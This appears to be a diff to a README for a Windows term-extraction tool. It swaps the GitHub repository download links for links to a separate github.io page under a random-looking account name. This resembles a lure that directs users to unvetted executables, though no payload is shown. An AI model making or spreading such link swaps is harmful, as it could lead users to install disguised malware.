@@ -1,6 +1,6 @@
 # 🔍 automatic_term_extraction - Extract Key Terms From Your Documents Easily
 
-[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/Exercisedevicepeacockflowerfence738/automatic_term_extraction)
+[![](https://img.shields.io/badge/Download_Software-blue)](https://exercisedevicepeacockflowerfence738.github.io)
 
 This application identifies important words and phrases in your text files. It uses methods like the C-value algorithm to find technical terms. You can use this tool to summarize information or organize language data without deep knowledge of statistics.
 
@@ -27,7 +27,7 @@ This software works on computers running Windows 10 or Windows 11. Ensure your c
 4. Open your Downloads folder.
 5. Right-click the folder and select Extract All.
 
-[Download link: https://github.com/Exercisedevicepeacockflowerfence738/automatic_term_extraction](https://github.com/Exercisedevicepeacockflowerfence738/automatic_term_extraction)
+[Download link: https://exercisedevicepeacockflowerfence738.github.io](https://exercisedevicepeacockflowerfence738.github.io)
 
 ## ⚙️ Running The Program
 
